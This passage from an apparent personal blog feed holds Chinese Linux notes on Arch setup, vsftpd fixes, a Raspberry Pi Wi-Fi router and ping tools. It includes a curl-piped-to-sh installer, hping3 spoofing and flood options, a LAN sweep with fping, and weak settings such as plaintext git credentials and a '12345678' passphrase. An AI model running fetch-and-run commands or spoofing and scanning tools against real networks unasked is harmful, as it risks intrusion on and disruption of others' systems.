pov.nanorc xml.nanorcdefault.nanorc javascript.nanorc nftables.nanorc python.nanorc 此时，我们可以在当前用户主目录下新建 .nanorc 文件，并添加 /usr/share/nano/*.nanorc 表示nano支持 /usr/share/nano 下的所有代码格式。 12$ cat ~/.nanorc include /usr/share/nano/*.nanorc 修改yay aur国内源建议用 yay 而不是 yaourt 12345sudo pacman -S yaynano ~/.config/yay/config.json "aururl": "https://aur.archlinux.org" 替换为 "aururl": "https://aur.tuna.tsinghua.edu.cn" 或者直接： yay --aururl &quot;https://aur.tuna.tsinghua.edu.cn&quot; --save 代理ProxyChains123sudo pacman -S proxychains-ngnano /etc/proxychains.conf 添加 " socks5 127.0.0.1 1080 " 比如 proxychains curl https://ip.cn Shadowsocks12pacman -S shadowsocks-qt5google-chrome-stable --proxy-server="socks5://127.0.0.1:1080" (暂时代理) Lantern1pacman -S lantern-bin XX-Net + Proxy SwitchyOmega + Chrome1234pacman -S xx-net或者到 Github clone git clone https://github.com/XX-net/XX-Net.git ... 音乐(网易云)1yaourt -S netease-cloud-music Office123wps-office,ttf-wps-fontslibreoffice永中Office https://www.yozosoft.com/home.htm 解压缩文件1sudo pacman -S file-roller xarchiver unzip unrar 数据库客户端管理1sqlitebrowser,dbeaver... 重命名网卡为eth0…之前: ifconfig enp12s0lowlp3s0b1 关键是 net.ifnames=0 12345678910111. ArchLinux-&gt; /etc/default/grub GRUB_CMDLINE_LINUX="" GRUB_CMDLINE_LINUX_DEFAULT="audit=0 loglevel=3 quiet net.ifnames=0"grub-mkconfig -o /boot/grub/grub.cfg2. CentOS-&gt; net.ifnames=0 biosdevname=0-&gt; /etc/sysconfig/grub &lt;=&gt; /etc/default/grub GRUB_CMDLINE_LINUX=... net.ifnames=0 biosdevname=0 ...grub2-mkconfig -o /boot/grub2/grub.cfg Vim配置(模板)12345678910111213141516171819202122232425262728293031323334353637383940414243set nocpset modelines=0set backspace=2syntax on autocmd InsertLeave * se noculautocmd InsertEnter * se culset smartindent set autoindentset confirm set tabstop=4 set softtabstop=4set shiftwidth=4 set expandtab set numberset history=50 set hlsearchset incsearchset gdefaultset encoding=utf-8set fileencodings=utf-8,ucs-bom,shift-jis,gb18030,gbk,gb2312,cp936,utf-16,big5,euc-jp,latin1set guifont=Menlo:h16:cANSI set langmenu=zn_CN.UTF-8set helplang=cn set ruler set laststatus=1 set showcmd set scrolloff=3set showmatch set matchtime=5set autowrite set wildmenu set linespace=2 set whichwrap=b,s,&lt;,&gt;,[,] filetype plugin indent on set foldenable set cursorline set magic set ignorecasefiletype on set background=darkset t_Co=256 set mouse=i set backspace=indent,eol,start Zshhttps://wiki.archlinux.org/index.php/Zsh_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)https://github.com/robbyrussell/oh-my-zsh/ 123456789101112sudo pacman -S zsh1. sudo pacman -S oh-my-zsh-git2. sh -c "$(wget -O- https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"3. sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"4. curl -Lo install.sh https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.shsh install.shsudo chsh -s /bin/zsh nano .zshrc ZSH_THEME="jtriley" plugin: zsh-syntax-highlightinggit clone https://github.com/zsh-users/zsh-syntax-highlighting ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting 虚拟机Virtualbox12pacman -S virtualbox virtualbox-host-modules-archpacman -S linux-headers linux 加载 VirtualBox 内核模块12345678910手动加载模块# modprobe -a vboxguest vboxsf vboxvideo# -&gt; modprobe vboxdrv# lsmod|grep vb vboxnetflt 32768 0 vboxnetadp 28672 0 vboxpci 28672 0 vboxdrv 503808 3 vboxpci,vboxnetadp,vboxnetflt开机自动加载模块,启用 vboxservice.service 服务 增强功能1234561. USB使用:sudo usermod -aG vboxusers whos 或 sudo gpasswd -a whos vboxusers2. 增强功能(载入ISO功能包)sudo pacman -S virtualbox-guest-iso--&gt; /usr/lib/virtualbox/additions/VBoxGuestAdditions.iso 或者自己去下载 VBoxGuestAdditions.iso ，并在使用virtualbox时载入iso https://download.virtualbox.org/virtualbox/6.0.10/ 下载拓展包1wget https://download.virtualbox.org/virtualbox/6.0.10/Oracle_VM_VirtualBox_Extension_Pack-6.0.10.vbox-extpack 手动挂载123456789在virtualbox虚拟机运行：mount -t vboxsf &lt;共享目录的名字&gt; &lt;客户机系统的挂载点&gt;查看 vboxsf 的挂载参数mount.vboxsf假如用户不在 vboxsf 组里，用这个命令可以把挂载点的读写权限授权给他：# mount -t vboxsf -o uid=1000,gid=1000 home /mnt/# usermod -aG vboxsf guest 百度云盘1sudo pacman -S baidunetdisk-bin MariaDB数据库1sudo pacman -S mariadb mariadb-libs mariadb-clients 安装 mariadb 软件包之后，你必须在启动 mariadb.service 之前运行下面这条命令： 1# mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql 用下面这个命令启动数据库级别的安全配置助手，来配置一些必要的安全选项 1mysql_secure_installation 关于Mariadb10.4身份验证发生的一些变化及其配置，可参考： Authentication in MariaDB 10.4 — Understanding the Changes或者SET PASSWORD 修改 root 密码（身份验证表在 *mysql.global_priv *可以 select *from mysql.global_priv; 查看） 1set password for &apos;root&apos;@&apos;%&apos; =password(&apos;xxxxxxxxx&apos;) 如果试图这样做 1UPDATE mysql.user SET Password=PASSWORD(&apos;xxxx&apos;) WHERE User=&apos;root&apos;; 那么得到的错误是ERROR 1348 (HY000): Column ‘Password’ is not updatable Qt5Wiki : https://wiki.archlinux.org/index.php/Qt_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87) 1sudo pacman -S qt5-base qt5-doc qtcreator 反正也可以从官网下载安装包自行安装，不过速度就。。。 Github SSH Key首先检查本机是否存在 SSH keys id_rsa id_rsa.pub 12ls ~/.sshid_rsa id_rsa.pub 接着 1234ssh-keygen -t rsa -C "my_email@example.com"eval "$(ssh-agent -s)"ssh-add ~/.ssh/id_rsacat ~/.ssh/id_rsa.pub 复制 id_rsa.pub 内容到：–&gt; Settings –&gt; SSH and GPG keys –&gt; New SSH key 测试是否成功 123456ssh -T git@github.com The authenticity of host 'github.com (13.250.177.223)' can't be established. RSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'github.com,13.250.177.223' (RSA) to the list of known hosts. Hi josexy! You've successfully authenticated, but GitHub does not provide shell access. 如此如此即ok，否则no 配置Git，比如我的这样子 1234git config --global user.name "josexy"git config --global user.email "josephxrays@163.com"git config --global color.ui true # 可选git config --global credential.helper store # 可选 迁移Github Page hexo假如要在另一台电脑上更新修改hexo搭建的博客，那么就要重新部署hexo。然而我们也可以不必如此，只需简单几步即可。 首先到博客根目录查看哪些文件/文件夹需要复制过去 123456789101112131415ls -la总用量 216drwxr-xr-x 8 josexy josexy 4096 8月 5 08:18 .drwxr-xr-x 6 josexy josexy 4096 8月 6 13:42 ..-rw-r--r-- 1 josexy josexy 2591 7月 21 00:22 _config.yml-rw-r--r-- 1 josexy josexy 174 8月 5 08:20 db.jsondrwxr-xr-x 62 josexy josexy 4096 8月 5 08:19 .deploy_git-rw-r--r-- 1 josexy josexy 65 7月 20 10:24 .gitignoredrwxr-xr-x 345 josexy josexy 20480 7月 20 20:57 node_modules-rw-r--r-- 1 josexy josexy 676 7月 20 20:57 package.json-rw-r--r-- 1 josexy josexy 148885 7月 20 20:57 package-lock.jsondrwxr-xr-x 61 josexy josexy 4096 8月 5 08:18 publicdrwxr-xr-x 2 josexy josexy 4096 7月 20 10:24 scaffoldsdrwxr-xr-x 7 josexy josexy 4096 7月 21 11:56 sourcedrwxr-xr-x 4 josexy josexy 4096 7月 20 11:39 themes 以下表格列出需要和不需要复制到其他主机的文件/文件夹 需要 不需要 themes themes/.git source public _config.yml db.json .gitignore .deploy_git package.json package-lock.json scaffolds node_modules 这样的话，我们就可以把 需要 的文件/文件夹复制过去了，为了能够在另一台主机上使用，还需要安装必要的application 123sudo pacman -S nodejssudo pacman -S npmsudo pacman -S git 接着在该目录下执行 npm install 即可安装hexo所需原来的模块，保存在node_modules。 没有必要 hexo init！没有必要 hexo init！没有必要 hexo init！**** 若出现类似 run npm audit fix to fix them, or npm audit for details npm WARN babel-eslint@10.0.2 requires a peer of eslint@&gt;= 4.12.1 but none is installed. You must install peer dependencies yourself. 按提示操作即可 如果不想每次都要输入github帐号密码，则需要配置 github ssh key ，方法请参见上文。然后 hexo g即可生成 public文件夹，hexo s本地运行，hexo d即可部署github 参考资料 参考Archlinux官网Wiki 以官方Wiki的方式安装ArchLinux arch linux 安装配置笔记 ArchLinux安装GNOME图形桌面环境 Arch Linux CN Community repo mirrors list Generating a new SSH key and adding it to the ssh-agent 使用hexo，如果换了电脑怎么更新博客 Arch Linux上安装搜狗输入法 Parted (简体中文)]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Archlinux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[配置Vsftpd遇到的问题]]></title>
    <url>%2Fvsftp-configure%2F</url>
    <content type="text"><![CDATA[目前我用的系统是archlinux，所以在配置vsftpd是不是一帆风顺的，这里将安装配置过程记录下来，也无法确保是否还有其他错误。 安装命令如下 1sudo pacman -S vsftpd 配置这是我现在的配置（注释已去） 123456789101112131415161718192021222324252627282930313233343536373839anonymous_enable=NOlocal_enable=YESwrite_enable=YESxferlog_enable=YESconnect_from_port_20=YESlisten=YESpam_service_name=vsftpdallow_writeable_chroot=YESlocal_root=/home/ftp_dirchroot_local_user=YESuse_localtime=YES# user_list_deny=NO# do not allow to login ftpuserlist_enable=YESuserlist_deny=NOuserlist_file=/etc/vsftpd.user_list# user free timeout# idle_session_timeout=30data_connection_timeout=10accept_timeout=120# local user transfer ratelocal_max_rate=50000max_clients=10max_per_ip=2pasv_enable=yespasv_min_port=5000pasv_max_port=6000seccomp_sandbox=NO# welcome messageftpd_banner=&gt;&gt;&gt;&gt;&gt; Welcome to MineFTP &lt;&lt;&lt;&lt;&lt;dirmessage_enable=YES VSFTP用户和文件目录设置1234567mkdir /home/ftp_diruseradd -d /home/ftp_dir mineftppasswd mineftpusermod -aG mineftp whosusermod -s /sbin/nologin mineftpchown mineftp:mineftp /home/ftp_direcho mineftp &gt;&gt; /etc/vsftpd.user_list 问题1. 500 OOPS: vsftpd: refusing to run with writable root inside chroot()把 chroot_local_user 和 allow_writeable_chroot 改为 YES，或者用 wiki上的 方法 123chroot_local_user=YESallow_writeable_chroot=YESsystemctl restart vsftpd 2. 530 Login incorrect修改/etc/pam.d/vsftpd将 auth required pam_shells.so 修改为 auth required pam_nologin.so 即可重启vsftpd 12345678$ nano /etc/pam.d/vsftpd #%PAM-1.0auth required /lib/security/pam_listfile.so item=user sense=deny file=/etc/ftpusers onerr=succeedauth required /lib/security/pam_unix.so shadow nullokauth required /lib/security/pam_nologin.soaccount required /lib/security/pam_unix.sosession required /lib/security/pam_unix.so 3. vsftpd.service: Main process exited, code=exited一定要把 vsftpd.conf 文件所有者(owner) 改为 root，否则vsftpd无法启动 1sudo chown root:root /etc/vsftpd.conf 错误信息： vsftpd.service - vsftpd daemon Loaded: loaded (/usr/lib/systemd/system/vsftpd.service; disabled; vendor preset: disabled) Active: failed (Result: exit-code) since Sun 2019-07-28 18:57:07 CST; 40s ago Process: 6607 ExecStart=/usr/bin/vsftpd (code=exited, status=2) Main PID: 6607 (code=exited, status=2) 7月 28 18:57:07 goo systemd[1]: Started vsftpd daemon.7月 28 18:57:07 goo systemd[1]: vsftpd.service: Main process exited, code=exited, status=2/INVALIDARGUMENT7月 28 18:57:07 goo systemd[1]: vsftpd.service: Failed with result ‘exit-code’. 参考： Vsftpd Wiki]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>vsftpd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派搭建简略WiFi无线路由器]]></title>
    <url>%2Fraspberry-wifi-router%2F</url>
    <content type="text"><![CDATA[目前我家有装有倆路由器，所以在搞一个觉得有点……然而本文介绍用树莓派来搭建一个简略的WiFi无线路由器，来体验树莓派的强大功能。 PS： 更新时间: 2019-08-13 21:13 安装环境用一根网线连接路由器和树莓派，用于提供网络无线网卡，这里我用很久以前买的那个360随身WiFi(悲催)主机：Archlinux，树莓派工具：hostapd，dnsmasq，iptables 树莓派配置信息插入网线网卡用网线连接好树莓派后开机，并在本机上ssh远程连接树莓派。以下是树莓派的一些配置信息，其中wlan1就是外置无线接口。 // 我本来是想将无线接口wlan1的IP配置成静态地址，而wlan0接入因特网。但现在我用网线连接到树莓派所以干脆把树莓派作为第二个路由器。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950pi@raspberrypi:~ $ uname -aLinux raspberrypi 4.9.80-v7+ #1098 SMP Fri Mar 9 19:11:42 GMT 2018 armv7l GNU/Linuxpi@raspberrypi:~ $ ifconfig eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.2.110 netmask 255.255.255.0 broadcast 192.168.2.255 inet6 fe80::ba27:ebff:fe51:c2cd prefixlen 64 scopeid 0x20&lt;link&gt; ether b8:27:eb:51:c2:cd txqueuelen 1000 (Ethernet) RX packets 286 bytes 19770 (19.3 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 257 bytes 33091 (32.3 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1 (Local Loopback) RX packets 6 bytes 522 (522.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 6 bytes 522 (522.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0wlan0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt; mtu 1500 inet 192.168.3.1 netmask 255.255.255.0 broadcast 192.168.3.255 ether b8:27:eb:04:97:98 txqueuelen 1000 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0pi@raspberrypi:~ $ iwconfig wlan1 IEEE 802.11 ESSID:off/any Mode:Managed Access Point: Not-Associated Tx-Power=0 dBm Retry short limit:7 RTS thr:off Fragment thr:off Power Management:on lo no wireless extensions.wlan0 IEEE 802.11 ESSID:off/any Mode:Managed Access Point: Not-Associated Tx-Power=31 dBm Retry short limit:7 RTS thr:off Fragment thr:off Power Management:on eth0 no wireless extensions.pi@raspberrypi:~ $ lsusb Bus 001 Device 005: ID 0c45:800a Microdia Vivitar Vivicam3350BBus 001 Device 004: ID 148f:760b Ralink Technology, Corp. MT7601U Wireless AdapterBus 001 Device 003: ID 0424:ec00 Standard Microsystems Corp. SMSC9512/9514 Fast Ethernet AdapterBus 001 Device 002: ID 0424:9514 Standard Microsystems Corp. SMC9514 HubBus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub 配置无线网卡这一步骤是修改树莓派的IP地址为路由器地址 123456789101112131415$ nano /etc/network/interfacesauto loiface lo inet loopbackauto eth0iface eth0 inet staticaddress 192.168.2.110netmask 255.255.255.0gateway 192.168.2.1#这里的IP地址其实相当于 "路由器" ip地址allow-hotplug wlan0iface wlan0 inet staticaddress 192.168.3.1netmask 255.255.255.0 配置hostapdhostapd能够“模拟”出一个AP，作为一个认证服务器，并对连接的设备控制管理。简单说hostapd能够让我们设置WiFi的名称，密码和加密方式等等 hostapd is a user space daemon for access point and authentication servers. It implements IEEE 802.11 access point management, IEEE 802.1X/WPA/WPA2/EAP Authenticators, RADIUS client, EAP server, and RADIUS authentication server. The current version supports Linux (Host AP, madwifi, mac80211-based drivers) and FreeBSD (net80211). 安装 hostapd 1sudo apt-get install hostapd 新建文件 /etc/hostapd/hostapd.conf ，并添加如下内容 1234567891011121314151617181920#无线网卡接口interface=wlan0#驱动程序driver=nl80211hw_mode=gssid=WIFI-001#通道channel=6#加密模式 WPA2wpa=2wpa_passphrase=12345678wpa_key_mgmt=WPA-PSKwpa_pairwise=CCMPrsn_pairwise=CCMPauth_algs=3wmm_enabled=1# 连接ap的最大数量max_num_sta=10logger_stdout=-1logger_stdout_level=2 其中 ssid 和 wpa_passphrase 分别为WiFi热点的名称和密码。 接着，还需修改 /etc/default/hostapd 12345678910111213141516171819# Defaults for hostapd initscript## See /usr/share/doc/hostapd/README.Debian for information about alternative# methods of managing hostapd.## Uncomment and set DAEMON_CONF to the absolute path of a hostapd configuration# file and hostapd will be started during system boot. An example configuration# file can be found at /usr/share/doc/hostapd/examples/hostapd.conf.gz#DAEMON_CONF="/etc/hostapd/hostapd.conf"# Additional daemon options to be appended to hostapd command:-# -d show more debug messages (-dd for even more)# -K include key data in debug messages# -t include timestamps in some debug messages## Note that -B (daemon mode) and -P (pidfile) options are automatically# configured by the init.d script and must not be added to DAEMON_OPTS.##DAEMON_OPTS="" 取消 DAEMON_CONF=”/etc/hostapd/hostapd.conf” 注释，并添加 hostapd.conf 的路径。这是hostapd守护进程默认要加载的配置文件，这样树莓派每次重启都会加载这个配置文件 测试当然，我们可以在此之前临时测试配置文件是否生效 1234567$ sudo hostapd /etc/hostapd/hostapd.confConfiguration file: /etc/hostapd/hostapd.confFailed to create interface mon.wlan0: -95 (Operation not supported)wlan0: Could not connect to kernel driverUsing interface wlan0 with hwaddr b8:27:eb:04:97:98 and ssid "Wifi"wlan0: interface state UNINITIALIZED-&gt;ENABLEDwlan0: AP-ENABLED 看到 wlan0: interface state UNINITIALIZED-&gt;ENABLEDwlan0: AP-ENABLED 就表示成功创建了一个AP，但无法连接到网络。 配置 dnsmasq Dnsmasq 提供 DNS 缓存和 DHCP 服务功能。作为域名解析服务器(DNS)，dnsmasq可以通过缓存 DNS 请求来提高对访问过的网址的连接速度。作为DHCP 服务器，dnsmasq 可以用于为局域网电脑分配内网ip地址和提供路由。DNS和DHCP两个功能可以同时或分别单独实现。dnsmasq轻量且易配置，适用于个人用户或少于50台主机的网络。 也就是说，利用dnsmasq的DNS缓存功能能够让连接AP的设备请求缓存下来，这样下次再连接就无法再需要输入密码，当然这只是暂时的。而通过DHCP就可以动态的为已经连接的设备分配网ip地址等信息。 安装 dnsmasq 1$ sudo apt-get install dnsmasq 编辑 /etc/dnsmasq.conf，其中大部分都是注释。在最后添加如下内容 12345interface=wlan0listen-address=127.0.0.1,192.168.3.1dhcp-range=192.168.3.50,192.168.3.150,12h# DNSresolv-file=/etc/resolv.conf dhcp-range 表示要动态分配给连接设备IP地址在所属IP网段范围之内，这里为50~150 /etc/resolv.conf 配置如下 1nameserver 8.8.8.8 开启IP转发功能注意，这一步是必须的，不然就算设备连接成功WiFi，那也无法连接到网络！！！ 123451. sudo sh -c "echo 1 &gt; /proc/sys/net/ipv4/ip_forward"2. sudo sysctl net.ipv4.ip_forward=1 sudo sysctl -p /etc/sysctl.confcat /proc/sys/net/ipv4/ip_forward 建议修改 /etc/sysctl.conf 文件，只需将 #net.ipv4.ip_forward=1 取消注释即可。 iptables防火墙路由转发这一步同上一步一样重要，这里主要是设置nat路由转发，不然还是无法上网的 1234567891011pi@raspberrypi:~ $ sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADEpi@raspberrypi:~ $ sudo iptables -t nat --line-numbers -L -nChain PREROUTING (policy ACCEPT)num target prot opt source destination Chain INPUT (policy ACCEPT)num target prot opt source destination Chain OUTPUT (policy ACCEPT)num target prot opt source destination Chain POSTROUTING (policy ACCEPT)num target prot opt source destination 1 MASQUERADE all -- 0.0.0.0/0 0.0.0.0/0 这里的意思是，路由器源地址（MASQUERADE自动获取当前树莓派IP地址[ 比如我这里为静态192.168.2.110 ])，并且已接入网络）将数据通过eth0接口转发到已连接的IP地址（0.0.0.0/0） 在这里 -j MASQUERADE 相当于 -j SNAT –to-source 192.168.2.110这个时候设备既可以连接到互联网了！ 开启启动服务1.开机自启动服务 12sudo systemctl enable hostapdsudo systemctl enable dnsmasq 2.自动设置iptables 1sudo iptables-save &gt; /home/pi/iptables_forward 添加如下内容到 /etc/rc.local (exit 0 之前) 1iptables-restore &lt; /home/pi/iptables_forward 注意还要开启了IP转发功能 之后 sudo reboot 重启，等待 结尾如果在 sudo systemctl enable hostapd 时出现一下信息 Synchronizing state of hostapd.service with SysV service script with /lib/systemd/systemd-sysv-install.Executing: /lib/systemd/systemd-sysv-install enable hostapdFailed to enable unit: Unit file /etc/systemd/system/hostapd.service is masked. 解决方法 sudo systemctl unmask hostapd 后再 sudo systemctl enable hostapd 最后的最后补成果图 bye~]]></content>
      <categories>
        <category>RaspberryPi</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux Ping工具汇总]]></title>
    <url>%2Flinux-ping-tools%2F</url>
    <content type="text"><![CDATA[大家都应该熟悉ping这个网络诊断工具，它用来检测网络是否连通以及目的主机是否在线。然而唯一缺点是它只支持ICMP协议。因此，大多数主机都会防火墙过滤ICMP数据包，不过，Linux下也有跟他类似的ping工具，本文将会介绍一些常见的工具。 ping一般作为所有系统默认自带的 ping ，它同样也很重要。通过 man ping 来查看ping的帮助手册 1234ping [-aAbBdDfhLnOqrRUvV46] [-c count] [-F flowlabel] [-i interval] [-I interface] [-l preload] [-m mark] [-M pmtudisc_option] [-N nodeinfo_option] [-w deadline] [-W timeout] [-p pattern] [-Q tos] [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp option] [hop ...] destination 常用的也就是 -c(发送数据包的数量)，-s(发送数据的字节大小)，-I(网络接口) 1234567&gt; ping baidu.com -c 2 -s 64PING baidu.com (111.13.101.208) 64(92) bytes of data.72 bytes from 111.13.101.208 (111.13.101.208): icmp_seq=1 ttl=55 time=44.2 ms72 bytes from 111.13.101.208 (111.13.101.208): icmp_seq=2 ttl=55 time=43.4 ms--- baidu.com ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1017msrtt min/avg/max/mdev = 43.490/43.873/44.257/0.436 ms 假如我要ping一个主机的IPv6地址，那么可以这样做(必须指定 -I eth0) 1234567&gt; ping -I eth0 fe80::2605:fff:fe41:e387 -c 2PING fe80::2605:fff:fe41:e387(fe80::2605:fff:fe41:e387) from fe80::2cca:ff77:78dc:1025%eth0 eth0: 56 data bytes64 bytes from fe80::2605:fff:fe41:e387%eth0: icmp_seq=1 ttl=255 time=1.67 ms64 bytes from fe80::2605:fff:fe41:e387%eth0: icmp_seq=2 ttl=255 time=4.43 ms--- fe80::2605:fff:fe41:e387 ping statistics ---2 packets transmitted, 2 received, 0% packet loss, time 1001msrtt min/avg/max/mdev = 1.671/3.054/4.438/1.384 ms 或者 ping6 -I eth0 fe80::2605:fff:fe41:e387 -c 2 fping相对来说fping比ping要高级点(也是通过ICMP协议来发送数据包的)，他可以向多个目标主机发送ping，也可以指定一个主机列表文件。其中，fping的 -g 选项比较重要 -g, –generate generate target list (only if no -f specified)(give start and end IP in the target list, or a CIDR address)(ex. fping -g 192.168.1.0 192.168.1.255 or fping -g 192.168.1.0/24) 12345678910111213141516171819202122232425262728293031323334353637383940fping --helpUsage: fping [options] [targets...]Probing options: -4, --ipv4 only ping IPv4 addresses -6, --ipv6 only ping IPv6 addresses -b, --size=BYTES amount of ping data to send, in bytes (default: 56) -B, --backoff=N set exponential backoff factor to N (default: 1.5) -c, --count=N count mode: send N pings to each target -f, --file=FILE read list of targets from a file ( - means stdin) -g, --generate generate target list (only if no -f specified) (give start and end IP in the target list, or a CIDR address) (ex. fping -g 192.168.1.0 192.168.1.255 or fping -g 192.168.1.0/24) -H, --ttl=N set the IP TTL value (Time To Live hops) -I, --iface=IFACE bind to a particular interface -l, --loop loop mode: send pings forever -m, --all use all IPs of provided hostnames (e.g. IPv4 and IPv6), use with -A -M, --dontfrag set the Don&apos;t Fragment flag -O, --tos=N set the type of service (tos) flag on the ICMP packets -p, --period=MSEC interval between ping packets to one target (in ms) (in loop and count modes, default: 1000 ms) -r, --retry=N number of retries (default: 3) -R, --random random packet data (to foil link data compression) -S, --src=IP set source address -t, --timeout=MSEC individual target initial timeout (default: 500 ms, except with -l/-c/-C, where it&apos;s the -p period up to 2000 ms)Output options: -a, --alive show targets that are alive -A, --addr show targets by address -C, --vcount=N same as -c, report results in verbose format -D, --timestamp print timestamp before each output line -e, --elapsed show elapsed time on return packets -i, --interval=MSEC interval between sending ping packets (default: 10 ms) -n, --name show targets by name (-d is equivalent) -N, --netdata output compatible for netdata (-l -Q are required) -o, --outage show the accumulated outage time (lost packets * packet interval) -q, --quiet quiet (don&apos;t show per-target/per-ping results) -Q, --squiet=SECS same as -q, but show summary every n seconds -s, --stats print final stats -u, --unreach show targets that are unreachable -v, --version show version 用法如下 12345678910111213141516&gt; fping -I eth0 -b 64 -f list_targets -a -q -s192.168.1.16 : xmt/rcv/%loss = 2/2/0%, min/avg/max = 58.0/74.1/90.1192.168.1.15 : xmt/rcv/%loss = 2/0/100%192.168.1.110 : xmt/rcv/%loss = 2/2/0%, min/avg/max = 1.48/3.39/5.31 3 targets 2 alive 1 unreachable 0 unknown addresses 1 timeouts (waiting for response) 6 ICMP Echos sent 4 ICMP Echo Replies received 0 other ICMP received 1.48 ms (min round trip time) 38.7 ms (avg round trip time) 90.1 ms (max round trip time) 2.022 sec (elapsed real time) -b 指定发送数据字节大小-f 指定一个目标主机列表文件，每行一个地址-a 只显示可以ping通的目标主机-q 安静模式，不显示在ping时的每个主机的结果-s 最后显示总计结果-r 重试次数，默认:3还可以指定 -g 来扫描局域网下所有主机 123456789101112131415161718192021222324&gt; fping -asgq 192.168.1.0/24192.168.1.1192.168.1.11192.168.1.6192.168.1.16192.168.1.3192.168.1.5192.168.1.12192.168.1.9192.168.1.105192.168.1.108192.168.1.110 254 targets 11 alive 243 unreachable 0 unknown addresses 243 timeouts (waiting for response) 983 ICMP Echos sent 11 ICMP Echo Replies received 964 other ICMP received 0.04 ms (min round trip time) 88.2 ms (avg round trip time) 268 ms (max round trip time) 11.633 sec (elapsed real time) 通过 -u 可以显示主机不可达的地址，如: fping -usgq 192.168.1.0/24 hping3这个hping3就比较强大的，它支持的协议有TCP，UDP，ICMP，支持使用tcl脚本。主要用途： 测试防火墙规则 测试入侵检测系统(IDS) 测试TCP/IP模式的安全漏洞 对于一些主机的防火墙过滤了ICMP数据包，那么我们可以使用hping3发送TCP数据包来判断主机是否存活 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788&gt; hping3 -husage: hping3 host [options] -h --help show this help -v --version show version -c --count packet count -i --interval wait (uX for X microseconds, for example -i u1000) --fast alias for -i u10000 (10 packets for second) --faster alias for -i u1000 (100 packets for second) --flood sent packets as fast as possible. Don&apos;t show replies. -n --numeric numeric output -q --quiet quiet -I --interface interface name (otherwise default routing interface) -V --verbose verbose mode -D --debug debugging info -z --bind bind ctrl+z to ttl (default to dst port) -Z --unbind unbind ctrl+z --beep beep for every matching packet receivedMode default mode TCP -0 --rawip RAW IP mode -1 --icmp ICMP mode -2 --udp UDP mode -8 --scan SCAN mode. Example: hping --scan 1-30,70-90 -S www.target.host -9 --listen listen modeIP -a --spoof spoof source address --rand-dest random destionation address mode. see the man. --rand-source random source address mode. see the man. -t --ttl ttl (default 64) -N --id id (default random) -W --winid use win* id byte ordering -r --rel relativize id field (to estimate host traffic) -f --frag split packets in more frag. (may pass weak acl) -x --morefrag set more fragments flag -y --dontfrag set don&apos;t fragment flag -g --fragoff set the fragment offset -m --mtu set virtual mtu, implies --frag if packet size &gt; mtu -o --tos type of service (default 0x00), try --tos help -G --rroute includes RECORD_ROUTE option and display the route buffer --lsrr loose source routing and record route --ssrr strict source routing and record route -H --ipproto set the IP protocol field, only in RAW IP modeICMP -C --icmptype icmp type (default echo request) -K --icmpcode icmp code (default 0) --force-icmp send all icmp types (default send only supported types) --icmp-gw set gateway address for ICMP redirect (default 0.0.0.0) --icmp-ts Alias for --icmp --icmptype 13 (ICMP timestamp) --icmp-addr Alias for --icmp --icmptype 17 (ICMP address subnet mask) --icmp-help display help for others icmp optionsUDP/TCP -s --baseport base source port (default random) -p --destport [+][+]&lt;port&gt; destination port(default 0) ctrl+z inc/dec -k --keep keep still source port -w --win winsize (default 64) -O --tcpoff set fake tcp data offset (instead of tcphdrlen / 4) -Q --seqnum shows only tcp sequence number -b --badcksum (try to) send packets with a bad IP checksum many systems will fix the IP checksum sending the packet so you&apos;ll get bad UDP/TCP checksum instead. -M --setseq set TCP sequence number -L --setack set TCP ack -F --fin set FIN flag -S --syn set SYN flag -R --rst set RST flag -P --push set PUSH flag -A --ack set ACK flag -U --urg set URG flag -X --xmas set X unused flag (0x40) -Y --ymas set Y unused flag (0x80) --tcpexitcode use last tcp-&gt;th_flags as exit code --tcp-mss enable the TCP MSS option with the given value --tcp-timestamp enable the TCP timestamp option to guess the HZ/uptimeCommon -d --data data size (default is 0) -E --file data from file -e --sign add &apos;signature&apos; -j --dump dump packets in hex -J --print dump printable characters -B --safe enable &apos;safe&apos; protocol -u --end tell you when --file reached EOF and prevent rewind -T --traceroute traceroute mode (implies --bind and --ttl 1) --tr-stop Exit when receive the first not ICMP in traceroute mode --tr-keep-ttl Keep the source TTL fixed, useful to monitor just one hop --tr-no-rtt Don&apos;t calculate/show RTT information in traceroute modeARS packet description (new, unstable) --apd-send Send the packet described with APD (see docs/APD.txt) 